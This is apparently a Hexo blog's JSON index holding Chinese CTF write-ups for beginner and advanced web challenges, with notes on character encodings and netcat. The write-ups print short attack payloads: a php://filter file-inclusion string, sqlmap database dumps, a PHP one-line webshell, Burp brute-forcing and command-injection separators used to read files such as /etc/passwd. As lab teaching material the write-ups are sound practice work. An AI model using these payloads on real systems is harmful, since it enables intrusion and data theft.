&#125; return 0;&#125;","categories":[{"name":"算法","slug":"算法","permalink":"https://singlemindedt.github.io/categories/算法/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://singlemindedt.github.io/tags/算法/"},{"name":"动态规划","slug":"动态规划","permalink":"https://singlemindedt.github.io/tags/动态规划/"}]},{"title":"文件包含漏洞","slug":"文件包含漏洞","date":"2019-09-23T16:13:50.000Z","updated":"2019-09-23T16:23:38.411Z","comments":true,"path":"2019/09/24/文件包含漏洞/","link":"","permalink":"https://singlemindedt.github.io/2019/09/24/文件包含漏洞/","excerpt":"","text":"php://filter（本地磁盘文件进行读取）元封装器，设计用于”数据流打开”时的”筛选过滤”应用，对本地磁盘文件进行读写。 用法： 123?filename=php://filter/convert.base64-encode/resource=xxx.php ?filename=php://filter/read=convert.base64-encode/resource=xxx.php 一样。 条件：只是读取，需要开启 allow_url_fopen，不需要开启 allow_url_include； MOCTF上这道文件包含题，直接 1?file=php://filter/convert.base64-encode/resource=flag.php 得到一串base64编码解码得到flag 关于文件包含漏洞","categories":[{"name":"CTF","slug":"CTF","permalink":"https://singlemindedt.github.io/categories/CTF/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://singlemindedt.github.io/tags/Web/"},{"name":"CTF","slug":"CTF","permalink":"https://singlemindedt.github.io/tags/CTF/"}]},{"title":"NewsCenter","slug":"攻防世界之Web高手进阶-NewsCenter","date":"2019-09-10T15:45:00.000Z","updated":"2019-12-30T05:41:24.198Z","comments":true,"path":"2019/09/10/攻防世界之Web高手进阶-NewsCenter/","link":"","permalink":"https://singlemindedt.github.io/2019/09/10/攻防世界之Web高手进阶-NewsCenter/","excerpt":"","text":"NewsCenter题目分析：打开链接，出现如下页面：[N1]:(https://dev.tencent.com/u/Single-minded_T/p/Single-minded_T/git/raw/master/images/N1.PNG) 实际操作： 尝试是否为sql注入：抓包： 利用sqlmap,命令：sqlmap.py -r 1.txt –dbs 看到有一个news，命令：sqlmap.py -r 1.txt -D news –dump 得到flag！","categories":[{"name":"Writeup","slug":"Writeup","permalink":"https://singlemindedt.github.io/categories/Writeup/"},{"name":"Web","slug":"Writeup/Web","permalink":"https://singlemindedt.github.io/categories/Writeup/Web/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://singlemindedt.github.io/tags/Web/"}]},{"title":"ics-06","slug":"攻防世界之Web高手进阶-ics-06","date":"2019-09-10T09:00:00.000Z","updated":"2019-12-30T05:24:32.339Z","comments":true,"path":"2019/09/10/攻防世界之Web高手进阶-ics-06/","link":"","permalink":"https://singlemindedt.github.io/2019/09/10/攻防世界之Web高手进阶-ics-06/","excerpt":"","text":"ics-06题目描述：云平台报表中心收集了设备管理基础服务的数据，但是数据被删除了，只有一处留下了入侵者的痕迹。 实际操作： 进入页面只有报表中心可以点击，有一个输入框，各种fuzzing，没成功，后来才知道直接爆破就行。。。 知识点补充：关于爆破","categories":[{"name":"Writeup","slug":"Writeup","permalink":"https://singlemindedt.github.io/categories/Writeup/"},{"name":"Web","slug":"Writeup/Web","permalink":"https://singlemindedt.github.io/categories/Writeup/Web/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://singlemindedt.github.io/tags/Web/"}]},{"title":"Cat","slug":"攻防世界之Web高手进阶-cat","date":"2019-09-09T16:00:00.000Z","updated":"2019-12-30T05:09:06.244Z","comments":true,"path":"2019/09/10/攻防世界之Web高手进阶-cat/","link":"","permalink":"https://singlemindedt.github.io/2019/09/10/攻防世界之Web高手进阶-cat/","excerpt":"","text":"Cat题目描述：仅给出了这样一个页面： 实际操作：输入cat，得到： 123456PING cat.ad-world-198302431-4658.rancher.internal (10.42.197.21) 56(84) bytes of data.64 bytes from b4fccc7cf554 (10.42.197.21): icmp_seq=1 ttl=64 time=0.045 ms--- cat.ad-world-198302431-4658.rancher.internal ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0msrtt min/avg/max/mdev = 0.045/0.045/0.045/0.000 ms 并在URL中如此传参： 1http://111.198.29.45:35113/index.php?url=cat 输入127.0.0.1： 123456PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.061 ms--- 127.0.0.1 ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0msrtt min/avg/max/mdev = 0.061/0.061/0.061/0.000 ms 尝试使用命令连接符/管道命令，均被屏蔽；目前仅知道，输入框通过用户输入进行GET方式传参；(此处请跳转文末 orz)那么只能从url入手了，看看有没有可能爆出一些有用的信息；测试发现超过ASCll可打印字符之外的url编码都会报错，比如键入http://111.198.29.45:35113/index.php?url=%8c ： 给出报错信息： 可以明显看到使用的是Django框架； 查看配置文件信息：settings.py 在报错信息中搜索database，发现的到有关数据库内容： 参考： 通过http://111.198.29.45:35113/index.php?url=@/opt/api/database.sqlite3 得到数据库内容：查找ctf关键字： 源码里就是GET啊，那这个又是啥？？？post?！orz orz orz","categories":[{"name":"Writeup","slug":"Writeup","permalink":"https://singlemindedt.github.io/categories/Writeup/"},{"name":"Web","slug":"Writeup/Web","permalink":"https://singlemindedt.github.io/categories/Writeup/Web/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://singlemindedt.github.io/tags/Web/"}]},{"title":"Win10安装pygame","slug":"pygame_install","date":"2019-09-09T15:37:45.000Z","updated":"2019-12-17T16:21:40.141Z","comments":true,"path":"2019/09/09/pygame_install/","link":"","permalink":"https://singlemindedt.github.io/2019/09/09/pygame_install/","excerpt":"","text":"检查pip是否安装，查看Python安装版本； 2. 1pip install wheel 3. 1pip install Pygame==1.9.6","categories":[{"name":"notes","slug":"notes","permalink":"https://singlemindedt.github.io/categories/notes/"}],"tags":[{"name":"tools","slug":"tools","permalink":"https://singlemindedt.github.io/tags/tools/"}]},{"title":"Byte CTF 字节跳动网络安全攻防大赛","slug":"Byte_CTF","date":"2019-09-09T08:36:00.000Z","updated":"2019-12-17T16:18:05.827Z","comments":true,"path":"2019/09/09/Byte_CTF/","link":"","permalink":"https://singlemindedt.github.io/2019/09/09/Byte_CTF/","excerpt":"","text":"betgame给了提示，nc 112.125.25.81 9999 知识补充：nc即netcat，被誉为网络安全界的“瑞士军刀”。透过使用TCP或UDP协议的网络连接去读写数据。它被设计成一个稳定的后门(back-end)工具，能够直接由其它程序和脚本轻松驱动。同时，它也是一个功能强大的网络调试和探测工具，能够建立你需要的几乎所有类型的网络连接. 使用之前首先我们要弄明白netcat的工作原理,其实netcat的原理很简单,它就是从网络的一端读入数据,然后输出到网络的另一端,它可以使用tcp 和udp协议.之所以叫做netcat,因为它是网络上的cat,想象一下cat的功能,读出一个文件的内容,然后输出到屏幕上(默认的stdout是屏幕,当然可以重定向到其他地方).netcat也是如此,它读取一端的输入,然后传送到网络的另一端。ncat/nc 既是一个端口扫描工具，也是一款安全工具，还能是一款监测工具，甚至可以做为一个简单的 TCP 代理。细节 实际操作：可以将nc作为聊天工具利用，本地server1上传nc 122.125.25.81 9999Server2启动监听9999端口：nc -lp 9999至此就可以简单交互，本题提示要30次全赢，找规律，对应输入即可； Linux nc命令详解","categories":[{"name":"Writeup","slug":"Writeup","permalink":"https://singlemindedt.github.io/categories/Writeup/"}],"tags":[{"name":"Misc","slug":"Misc","permalink":"https://singlemindedt.github.io/tags/Misc/"}]},{"title":"CTF中常见编码","slug":"CTF中常见编码总结","date":"2019-09-08T01:05:00.000Z","updated":"2019-12-17T13:45:20.583Z","comments":true,"path":"2019/09/08/CTF中常见编码总结/","link":"","permalink":"https://singlemindedt.github.io/2019/09/08/CTF中常见编码总结/","excerpt":"","text":"ASCII码表 ASCII（American Standard Code for Information Interchange，美国信息交换标准代码）是基于拉丁字母的一套电脑编码系统，主要用于显示现代英语和其他西欧语言。它是现今最通用的单字节编码系统，并等同于国际标准ISO/IEC 646。 编码方法 因为1位二进制数可以表示（2^1=）2种状态：0、1；而2位二进制数可以表示（2^2）=4种状态：00、01、10、11；依次类推，7位二进制数可以表示（2^7=）128种状态，每种状态都唯一地编为一个7位的二进制码，对应一个字符（或控制码），这些码可以排列成一个十进制序号0～127。所以，7位ASCII码是用七位二进制数进行编码的，可以表示128个字符。 第0～32号及第127号(共34个)是控制字符或通讯专用字符，如控制符：LF（换行）、CR（回车）、FF（换页）、DEL（删除）、BEL（振铃）等；通讯专用字符：SOH（文头）、EOT（文尾）、ACK（确认）等； ASCII码大致可以分作三部分组成：第一部分是：ASCII非打印控制字符第二部分是：ASCII打印字符第三部分是：扩展ASCII打印字符 第一部分：ASCII非打印控制字符表ASCII表上的数字0–31分配给了控制字符，用于控制像打印机等一些外围设备。例如，12代表换页/新页功能。此命令指示打印机跳到下一页的开头。（参详ASCII码表中0-31） 第二部分：ASCII打印字符数字 32–126 分配给了能在键盘上找到的字符，当您查看或打印文档时就会出现。数字127代表 DELETE 命令。（参详ASCII码表中32-127） 第三部分：扩展ASCII打印字符扩展的ASCII字符满足了对更多字符的需求。扩展的ASCII包含ASCII中已有的128个字符（数字0–32显示在下图中），又增加了128个字符，总共是256个。即使有了这些更多的字符，许多语言还是包含无法压缩到256个字符中的符号。因此，出现了一些ASCII的变体来囊括地区性字符和符号。例如，许多软件程序把ASCII表（又称作ISO8859-1）用于北美、西欧、澳大利亚和非洲的语言。 特征特点：用1个字节的8位数来编码英文字符集，即所有字母数字等英文符号可以用二进制数、十进制、十六进制来表示。 Unicode编码Unicode是一个编码方案，Unicode 是为了解决传统的字符编码方案的局限而产生的，它为每种语言中的每个字符设定了统一并且唯一的二进制编码，以满足跨语言、跨平台进行文本转换、处理的要求。Unicode 编码共有三种具体实现，分别为utf-8,utf-16,utf-32，其中utf-8占用一到四个字节，utf-16占用二或四个字节，utf-32占用四个字节。 UTF-8UTF-8以字节为单位对Unicode进行编码。从Unicode到UTF-8的编码方式如下：|Unicode编码(十六进制)|UTF-8 字节流(二进制)||:——–:|:————-:|| 000000-00007F | 0xxxxxxx || 000080-0007FF | 110xxxxx 10xxxxxx || 000800-00FFFF | 1110xxxx 10xxxxxx 10xxxxxx|| 010000-10FFFF | 11110xxx10xxxxxx10xxxxxx10xxxxxx|UTF-8的特点是对不同范围的字符使用不同长度的编码。对于0x00-0x7F之间的字符，UTF-8编码与ASCII编码完全相同。UTF-8编码的最大长度是4个字节。从上表可以看出，4字节模板有21个x，即可以容纳21位二进制数字。Unicode的最大码位0x10FFFF也只有21位。 例1：“汉”字的Unicode编码是0x6C49。0x6C49在0x0800-0xFFFF之间，使用3字节模板：1110xxxx 10xxxxxx 10xxxxxx。将0x6C49写成二进制是：0110 1100 0100 1001， 用这个比特流依次代替模板中的x，得到：11100110 10110001 10001001，即E6 B1 89。 例2：Unicode编码0x20C30在0x010000-0x10FFFF之间，使用4字节模板：11110xxx 10xxxxxx 10xxxxxx 10xxxxxx。将0x20C30写成21位二进制数字（不足21位就在前面补0）：0 0010 0000 1100 0011 0000，用这个比特流依次代替模板中的x，得到：11110000 10100000 10110000 10110000，即F0 A0 B0 B0。 [UTF-8\\UTF-32]UTF-8\\UTF-32 Unicode一般有四种表示形式 &amp;#x [Hex] &#x0054;&#x0068;&#x0065; &amp;# [Decimal] &#00084;&#00104;&#00101; \\U [Hex] \\U0054\\U0068\\U0065 \\U+ [Hex] \\U+0054\\U+0068\\U+0065 特征特点：国际标准字符，将全球的各种语言的每个字符定义一个唯一的编码，以满足跨语言、跨平台文本信息的转换，当编码和解码的字符集出现不一致的时候就会出现乱码。 URL编码url编码是一种浏览器用来打包表单输入的格式。浏览器从表单中获取所有的name和其中的值 ，将它们以name/value参数编码（移去那些不能传送的字符，将数据排行等等）作为URL的一部分或者分离地发给服务器。不管哪种情况，在服务器端的表单输入格式样子象这样：theName=Ichabod+Crane&amp;gender=male&amp;status=missing&amp; ;headless=yesURL地址（常说网址）规定了常用地数字，字母可以直接使用，另外一批作为特殊用户字符也可以直接用（/,:@等），剩下的其它所有字符必须通过%后跟两位十六进制数来替换非ASCII字符。 编码规则URL编码遵循下列规则： 每对name/value由&amp;；符分开；每对来自表单的name/value由=符分开。如果用户没有输入值给这个name，那么这个name还是出现，只是无值。任何特殊的字符（就是那些不是简单的七位ASCII，如汉字）将以百分符%用十六进制编码，当然也包括象 =,&amp;；，和 % 这些特殊的字符。其实url编码就是一个字符ascii码的十六进制。不过稍微有些变动，需要在前面加上“%”。比如： “\\”，它的ascii码是92，92的十六进制是5c，所以“\\”的url编码就是%5c。 空格字符，ascii 码是 32，对应16 进制是‘20’，那么 urlencode 编码结果是:%20。 URL编码平时是用不到的，因为IE会自动将输入到地址栏的非数字字母转换为url编码。曾有人提出数据库名字里带上“#”以防止被下载，因为IE遇到#就会忽略后面的字母。破解方法很简单——用url编码%23替换掉#。 特征特点：字符ASCII码的十六进制，并在前面加上% URL原理、URL编码、URL特殊字符 base64编码Base64是网络上最常见的用于传输8Bit字节码的编码方式之一，Base64就是一种基于64个可打印字符来表示二进制数据的方法。 Base64编码是从二进制到字符的过程，可用于在HTTP环境下传递较长的标识信息。采用Base64编码具有不可读性，需要解码后才能阅读。 Base64由于以上优点被广泛应用于计算机的各个领域，然而由于输出内容中包括两个以上“符号类”字符（+, /, =)，不同的应用场景又分别研制了Base64的各种“变种”。为统一和规范化Base64的输出，Base62x被视为无符号化的改进版本。 Base64要求把每三个8Bit的字节转换为四个6Bit的字节（38 = 46 = 24），然后把6Bit再添两位高位0，组成四个8Bit的字节，也就是说，转换后的字符串理论上将要比原来的长1/3。 特征：密文由64个字符(A-Z,a-z,0-9,+,/)组成，末尾可能会出现1或2个’=’ 最多有2个 规则 把3个字节变成4个字节。 每76个字符加一个换行符。 最后的结束符也要处理。 字符串转为2进制，每3个8位二进制转化为4个6位二进制，六位二进制转化为十进制，根据十进制数值在base64编码表中获取字符。Base64编码将串起来的二进制以6位进行分割.所以分切之前的二进制位数应该是24的倍数(即6,8的最小公倍数).如果不足24位,则在编码后数据后面添加”=”(=为填充字符)例子1转换前 11111111, 11111111, 11111111 （二进制）转换后 00111111, 00111111, 00111111, 00111111 （二进制）上面的三个字节是原文，下面的四个字节是转换后的Base64编码，其前两位均为0。转换后，我们用一个码表来得到我们想要的字符串（也就是最终的Base64编码），这个表是这样的：（摘自RFC2045）转换表： 例子2转换前 10101101,10111010,01110110转换后 00101011, 00011011 ,00101001 ,00110110十进制 43 27 41 54对应码表中的值 r b p 2所以上面的24位编码，编码后的Base64值为 rbp2解码同理，把 rbq2 的二进制位连接上再重组得到三个8位值，得出原码。 base32编码Base32使用了ASCII编码中可打印的32个字符(大写字母AZ和数字27)对任意字节数据进行编码.Base32将串起来的二进制数据按照5个二进制位分为一组,由于传输数据的单位是字节(即8个二进制位).所以分割之前的二进制位数是40的倍数(40是5和8的最小公倍数).如果不足40位,则在编码后数据补充”=”,一个”=”相当于一个组(5个二进制位),编码后的数据是原先的8\\5倍. 特征：密文由32个字符（A-Z,2-7)组成，末尾可能会有‘=’，但最多有6个 base16 base16是用16（2的4次方）个特定ASCII码表示256个ASCII字符。1个ASCII字符经过base16编码后会变为2个字符，长度增加一倍。 将数据转换为二进制数，不足8比特位高位补0.然后将所有的二进制全部串起来,4个二进制位为一组,转化成对应十进制数,根据十进制数值找到Base16编码表里面对应的字符.Base16是4个比特位表示一个字符,所以原始是1个字节(8个比特位)刚好可以分成两组,也就是说原先如果使用ASCII编码后的一个字符,现在转化成两个字符.数据量是原先的2倍,不需要补’=’ 特征：密文由16个字符（0-9,A-F）组成 数值 0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 字符 0 1 2 3 4 5 6 7 8 9 A B C D E F","categories":[{"name":"CTF","slug":"CTF","permalink":"https://singlemindedt.github.io/categories/CTF/"}],"tags":[{"name":"编码","slug":"编码","permalink":"https://singlemindedt.github.io/tags/编码/"}]},{"title":"攻防世界之Web新手（7-12）","slug":"攻防世界之Web新手（7-12）","date":"2019-09-05T13:09:03.000Z","updated":"2019-12-30T04:37:17.261Z","comments":true,"path":"2019/09/05/攻防世界之Web新手（7-12）/","link":"","permalink":"https://singlemindedt.github.io/2019/09/05/攻防世界之Web新手（7-12）/","excerpt":"","text":"simple_js题目描述：小宁发现了一个网页，但却一直输不对密码。(Flag格式为 Cyberpeace{xxxxxxxxx} )打开链接空白，查看源码，有如下代码： 12345678910111213141516171819202122232425262728293031function dechiffre(pass_enc) &#123; var pass = \"70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65\"; var tab = pass_enc.split(','); var tab2 = pass.split(','); var i, j, k, l = 0, m, n, o, p = \"\"; i = 0; j = tab.length; k = j + (l) + (n = 0); n = tab2.length; for (i = (o = 0); i &lt; (k = j = n); i++) &#123; o = tab[i - l]; p += String.fromCharCode((o = tab2[i])); if (i == 5) break; &#125; for (i = (o = 0); i &lt; (k = j = n); i++) &#123; o = tab[i - l]; if (i &gt; 5 &amp;&amp; i &lt; k - 1) p += String.fromCharCode((o = tab2[i])); &#125; p += String.fromCharCode(tab2[17]); pass = p; return pass;&#125;String[\"fromCharCode\"](dechiffre( \"\\x35\\x35\\x2c\\x35\\x36\\x2c\\x35\\x34\\x2c\\x37\\x39\\x2c\\x31\\x31\\x35\\x2c\\x36\\x39\\x2c\\x31\\x31\\x34\\x2c\\x31\\x31\\x36\\x2c\\x31\\x30\\x37\\x2c\\x34\\x39\\x2c\\x35\\x30\"));h = window.prompt('Enter password');alert(dechiffre(h)); 这一长串16进制数很可疑， 1\"\\x35\\x35\\x2c\\x35\\x36\\x2c\\x35\\x34\\x2c\\x37\\x39\\x2c\\x31\\x31\\x35\\x2c\\x36\\x39\\x2c\\x31\\x31\\x34\\x2c\\x31\\x31\\x36\\x2c\\x31\\x30\\x37\\x2c\\x34\\x39\\x2c\\x35\\x30\" 转字符得到：55,56,54,79,115,69,114,116,107,49,50再将其转换为10进制ASCII码对应的字符得到 ：786OsErtk12加上题目给出的格式得到flag（解码函数似乎不能得到正确密码//orz？） xff_referer题目描述：X老师告诉小宁其实xff和referer是可以伪造的。打开链接如图： X-Forwarded-For和RefererXFF构造来源IPReferer构造来源浏览器X-Forwarded-For:简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP，只有在通过了HTTP 代理或者负载均衡服务器时才会添加该项HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的，服务器基此可以获得一些信息用于处理利用bp抓包： 在HTTP头添加：X-Forwarded-For:123.123.123.123 得到下图提示： 再加一条Referer:https://www.google.com 得到flag。1:(/images/7.5.png)由于每次添加都要重新输入，这里可以利用Repeater功能： 得到： 可以在左边直接编辑Request—&gt;右侧得到Response： Response—&gt;Flag! 自己编辑的时候注意Target的格式： 去掉请求协议http:// 相关知识URL与URI：https://blog.csdn.net/lslk9898/article/details/86490383 weak_auth题目描述：小宁写了一个登陆验证页面，随手就设了一个密码。 根据弹窗的提示，用户名必须是admin将usename设置为admin，随手！！！真的是随手，输了个123456，结果对了hhh :) —————————-正常解法———————-用Burp Suite对它进行密码爆破，可以先试着输入username=admin和password=11111,以确定爆破位置。Action—&gt;send to Intruder 基本配置：1、在消息编辑器的上方，有一个下拉选择框，攻击类型（Attack Type），几种不同的方式，这里选择：集束炸弹模式（Cluster bomb） 它可以使用多组Payload集合，在每一个不同的Payload标志位置上（最多20个），依次遍历所有的Payload。它与草叉模式的主要区别在于，执行的Payload数据Payload组的乘积。举例来说，如果有两个Payload标志位置，第一个Payload值为A和B，第二个Payload值为C和D，则发起攻击时，将共发起四次攻击，第一次使用的Payload分别为A和C，第二次使用的Payload分别为A和D，第三次使用的Payload分别为B和C，第四次使用的Payload分别为B和D。 2、由于username规定用admin；简单列表（Simple list） ——最简单的Payload类型，通过配置一个字符串列表作为Payload，也可以手工添加字符串列表或从文件加载字符串列表。其设置界面如下图 3、导入密码list 4、可选项设置（Options）可选项设置主要包括请求消息头设置、请求引擎设置、攻击结果设置、grep match, grep extract, grep payloads,以及重定向设置。在使用中，你可以在攻击前进行设置，也可以在攻击过程中做这些选项的调整。 开始爆破： 可以明显看到出现了长度不一样的响应，123456应该就是正确密码，查看Response得到Flag。 webshell题目描述：小宁百度了php一句话,觉着很有意思,并且把它放在index.php里。 知识补充：webshell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门。黑客在入侵了一个网站后，通常会将asp或php后门文件与网站服务器WEB目录下正常的网页文件混在一起，然后就可以使用浏览器来访问asp或者php后门，得到一个命令执行环境，以达到控制网站服务器的目的。顾名思义，“web”的含义是显然需要服务器开放web服务，“shell”的含义是取得对服务器某种程度上操作权限。webshell常常被称为入侵者通过网站端口对网站服务器的某种程度上操作的权限。由于webshell其大多是以动态脚本的形式出现，也有人称之为网站的后门工具。上传木马拿webshell的方法汇总图片给出的代码为php一句话木马：一句话木马的工作原理：一句话木马分析服务端与客户端。 “一句话木马”服务端（是用于本地的html提交脚本木马文件）就是我们要用来插入到asp文件中的asp语句，（不仅仅是以asp为后缀的数据库文件），该语句将回为触发，接收入侵者通过客户端提交的数据，执行并完成相应的操作，服务端的代码内容为 &lt;%execute request(“value”)%&gt; 其中value可以自己修改“一句话木马”客户端（远程服务器上被插入一句话的asp可执行文件）用来向服务端提交控制数据的，提交的数据通过服务端构成完整的asp功能语句并执行，也就是生成我们所需要的asp木马文件 用中国菜刀或者蚁剑等工具可以上传或执行命令，密码是shell。 连接成功： 选择双击： 看到flag.txt,打开： command_execution题目描述：小宁写了个ping功能,但没有写waf,X老师告诉她这是非常危险的，你知道为什么吗。 知识补充：1、ping （网络诊断工具）Ping是Windows、Unix和Linux系统下的一个命令。ping也属于一个通信协议，是TCP/IP协议的一部分。利用“ping”命令可以检查网络是否连通，可以很好地帮助我们分析和判定网络故障。应用格式：ping空格IP地址。该命令还可以加许多参数使用，具体是键入ping按回车即可看到详细说明。作为一个生活在网络上的管理员或者黑客来说，ping命令是第一个必须掌握的DOS命令，它所利用的原理是这样的：利用网络上机器IP地址的唯一性，给目标IP地址发送一个数据包，再要求对方返回一个同样大小的数据包来确定两台网络机器是否连接相通，时延是多少。ping指的是端对端连通，通常用来作为可用性的检查， 但是某些病毒木马会强行大量远程执行ping命令抢占你的网络资源，导致系统变慢，网速变慢。严禁ping入侵作为大多数防火墙的一个基本功能提供给用户进行选择。 2、有关命令执行的知识windows或linux下： 1234command1 &amp; command2 ：先执行command2后执行command1command1 &amp;&amp; command2 ：先执行command1后执行command2command1 | command2 ：只执行command2command1 || command2 ：command1执行失败，再执行command2(若command1执行成功，就不再执行command2) 3、WAFWeb应用防护系统（也称为：网站应用级入侵防御系统。英文：Web Application Firewall，简称： WAF）。利用国际上公认的一种说法：Web应用防火墙是通过执行一系列针对HTTP/HTTPS的安全策略来专门为Web应用提供保护的一款产品。Web应用防火墙会对HTTP的请求进行异常检测，拒绝不符合HTTP标准的请求。并且，它也可以只允许HTTP协议的部分选项通过，从而减少攻击的影响范围。甚至，一些Web应用防火墙还可以严格限定HTTP协议中那些过于松散或未被完全制定的选项。（WAF绕过）此题给出未开WAF，所以不用考虑这一步。 4、还需要掌握一些常用的命令ls 对于目录，该命令列出该目录下的所有子目录与文件。对于文件，将列出文件名以及其他信息。Cd 改变工作目录，将当前工作目录改变到指定的目录下。cat是打印文件内容tac 是反向打印less 文件名：分页显示文件内容（如less /etc/passwd）Find 沿着文件层次结构向下遍历，匹配符合条件的文件，并执行相应操作。关于find可以参考：https://www.jianshu.com/p/16af649d9b6d*&lt;利用截断来执行行的命令，如’$’ 和 ‘ ; ‘和 ‘|’ 和 ‘-‘ 和 ‘(‘ 和 ‘ ) ‘ 和 ‘ “ ‘ 和 ‘||’ 和’&amp;&amp;’ 和 ‘&amp;’ 和 ‘{‘ 和 ‘}’等&gt;*实际操作： 试着使用命令连接符，查看目录 发现有home目录，看看里面有啥： 发现有flag.txt;或者直接根据文件名或正则表达式进行搜索，如下： 得到flag.txt在home下，cat一下： 同时这道题，查看代码可以发现：POST传参是通过参数target，而target就是我们所要输入的值 尝试post传值： 得到flag: simple_php##题目描述：小宁听说php是最好的语言,于是她简单学习之后写了几行php代码。打开链接： 很简单的PHP代码：a要等于0，又不能等于0；b不能是数字，但还要大于1234 is_numeric（）来函数用于检测变量是否为数字或数字字符串。如果指定的变量是数字和数字字符串则返回TRUE，否则返回FALSE。 此处靠php弱类型比较：可查看我的这篇博文构造如下url:","categories":[{"name":"CTF","slug":"CTF","permalink":"https://singlemindedt.github.io/categories/CTF/"},{"name":"Web","slug":"CTF/Web","permalink":"https://singlemindedt.github.io/categories/CTF/Web/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://singlemindedt.github.io/tags/Web/"}]},{"title":"Images","slug":"images","date":"2019-09-04T09:37:45.000Z","updated":"2019-09-05T14:33:05.157Z","comments":true,"path":"2019/09/04/images/","link":"","permalink":"https://singlemindedt.github.io/2019/09/04/images/","excerpt":"","text":"Inset demo …","categories":[],"tags":[]},{"title":"攻防世界之Web新手（1-6）","slug":"攻防世界之Web新手（1-6）","date":"2019-09-04T07:11:48.415Z","updated":"2019-12-30T03:22:38.168Z","comments":true,"path":"2019/09/04/攻防世界之Web新手（1-6）/","link":"","permalink":"https://singlemindedt.github.io/2019/09/04/攻防世界之Web新手（1-6）/","excerpt":"","text":"[TOC] view_source题目描述：X老师让小宁同学查看一个网页的源代码，但小宁同学发现鼠标右键好像不管用了。打开链接如下： view0 方法1试试右键的确不管用了，直接F12，找到flag 方法2另外还可以通过view-source：url查看源代码： 方法3其实还可以禁用Js代码，这样右键就可以用了： get_post题目描述：X老师告诉小宁同学HTTP通常使用两种请求方法，你知道是哪两种吗？ 知识补充：两种 HTTP 请求方法：GET 和 POST在客户机和服务器之间进行请求-响应时，两种最常被用到的方法是：GET 和 12345POST。&#123;GET - 从指定的资源请求数据。POST - 向指定的资源提交要被处理的数据&#125; https://www.w3school.com.cn/tags/html_ref_httpmethods.asp https://baijiahao.baidu.com/s?id=1620934682611653374&amp;wfr=spider&amp;for=pc 实际操作：打开网址，得到如下要求 &lt;用GET给后端传参的方法是：在?后跟变量名字，不同的变量之间用&amp;隔开&gt;在url后添加/？a=1即可发送get请求。 利用hackbar进行POST传参：复制get的url，选择postdata，填入b=2，选择execute。即可发送POST请求。 关于GET 和 POST：https://www.cnblogs.com/williamjie/p/9099940.html Robots题目描述：X老师上课讲了Robots协议，小宁同学却上课打了瞌睡，赶紧来教教小宁Robots协议是什么吧。 知识补充： robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。robots.txt文件告诉蜘蛛程序在服务器上什么文件是可以被查看的。 当一个搜索蜘蛛访问一个站点时，它会首先检查该站点根目录下是否存在robots.txt，如果存在，搜索机器人就会按照该文件中的内容来确定访问的范围；如果该文件不存在，所有的搜索蜘蛛将能够访问网站上所有没有被口令保护的页面。百度官方建议，仅当您的网站包含不希望被搜索引擎收录的内容时，才需要使用robots.txt文件。如果您希望搜索引擎收录网站上所有内容，请勿建立robots.txt文件。 如果将网站视为酒店里的一个房间，robots.txt就是主人在房间门口悬挂的“请勿打扰”或“欢迎打扫”的提示牌。这个文件告诉来访的搜索引擎哪些房间可以进入和参观，哪些房间因为存放贵重物品，或可能涉及住户及访客的隐私而不对搜索引擎开放。但robots.txt不是命令，也不是防火墙，如同守门人无法阻止窃贼等恶意闯入者。 Robots协议用来告知搜索引擎哪些页面能被抓取，哪些页面不能被抓取；可以屏蔽一些网站中比较大的文件，如：图片，音乐，视频等，节省服务器带宽；可以屏蔽站点的一些死链接。方便搜索引擎抓取网站内容；设置网站地图连接，方便引导蜘蛛爬取页面。【https://blog.csdn.net/qq_40491569/article/details/83473703】 实际操作：打开网页空白； 在题URL后输入/robots.txt即： http://111.198.29.45:35567/robots.txt f1ag_1s_h3re.php这个页面不允许被爬取，查看一下f1ag_1s_h3re.php页面得到flag. Backup题目描述：X老师忘记删除备份文件，他派小宁同学去把备份文件找出来,一起来帮小宁同学吧！ 知识补充备份文件: bak（被自动或是通过命令创建的辅助文件，它包含某个文件的最近一个版本） 实际操作试着在index.php后加.bak得到index.php.bak的备份文件，打开得到flag Cookie知识补充： Cookie 可以翻译为“小甜品，小饼干”，Cookie 在网络系统中几乎无处不在，当我们浏览以前访问过的网站时，网页中可能会出现 ：你好 XXX，这会让我们感觉很亲切，就好像吃了一个小甜品一样。这其实是通过访问主机中的一个文件来实现的，这个文件就是 Cookie。在 Internet 中，Cookie 实际上是指小量信息，是由Web服务器创建的，将信息存储在用户计算机上的文件。一般网络用户习惯用其复数形式 Cookies，指某些网站为了辨别用户身份、进行Session 跟踪而存储在用户本地终端上的数据，而这些数据通常会经过加密处理。其实cookies是由网络服务器存储在你电脑硬盘上的一个txt类型的小文件，它和你的网络浏览行为有关，所以存储在你电脑上的cookies就好像你的一张身份证，你电脑上的cookies和其他电脑上的cookies是不一样的;cookies不能被视作代码执行，也不能成为病毒，所以它对你基本无害。cookies的作用主要是，当你访问了某些网页，并且对网页的一些设置进行修改，cookies就能跟踪并记录到这些修改，当你下一次访问这个网页的时候，这个网页会分析你电脑上的cookies，进而采取措施像你返回更符合你个性化的网页; 当然，目前大部分广告的定位基础也是基于cookies的，比如你此前访问了大量的健身类网站，cookies记录了你的访问行为，广告主就能够根据你的访问行为，向你推送健身类的广告。 实际操作：利用开发者工具F12键—网络，查看消息头看到“Cookie look-here=cookie.php” 根据提示信息，在URL后加上”/cookie.php”即http://111.198.29.45:47420/cookie.php 提示查看HTTP响应，在消息头里发现flag。 disabled_button题目描述：X老师今天上课讲了前端知识，然后给了大家一个不能按的按钮，小宁惊奇地发现这个按钮按不下去，到底怎么才能按下去呢？ 知识补充：需要熟悉一些常见的HTML知识 实际操作：右键-&gt;查看元素，在input中用了‘disabled=” 